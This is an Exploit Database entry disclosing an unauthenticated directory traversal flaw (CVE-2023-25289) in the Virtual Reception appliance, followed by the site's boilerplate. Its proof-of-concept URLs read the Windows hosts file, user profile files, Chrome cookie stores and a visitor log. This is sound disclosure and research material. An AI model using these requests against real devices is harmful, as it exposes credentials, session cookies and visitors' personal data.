**Vulnerable App:**

```
# Exploit Title: Virtual Reception v1.0 - Web Server Directory Traversal
# Exploit Author: Spinae
# Vendor Homepage: https://www.virtualreception.nl/
# Version: win7sp1_rtm.101119-1850 6.1.7601.1.0.65792 running on an Intel NUC5i5RY
# Tested on: all
# CVE-ID: CVE-2023-25289

We discovered the web server of the Virtual Reception appliance is prone to
an unauthenticated directory traversal vulnerability. This allows an
attacker to traverse outside the server root directory by specifying files
at the end of a URL request.
This is a NUC5i5RY

http://[ip address]/c:/WINDOWS/System32/drivers/etc/hosts
http://[ip address]/C:/windows/WindowsUpdate.log
...

A user called 'receptie' exists on the Windows system:

http://[ip address]/c:/users/receptie/ntuser.dat
http://[ip address]/c:/users/receptie/ntuser.ini
http://[ip address]/c:/users/receptie/appdata/local/temp/wmsetup.log
...

http://[ip
address]/c:/users/receptie/AppData/Local/Google/Chrome/User%20Data/Local%20State
http://[ip address]/c:/users/receptie/AppData/Local/Google/Chrome/User
Data/Default/Cookies
...

The appliance also keeps a log of the visitors that register at the
entrance:

http://[ip address]/visitors.csv

hash icon for shodan searches:

No reply from the vendor (phone, email, website form submissions), first
reported in 2021.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept...
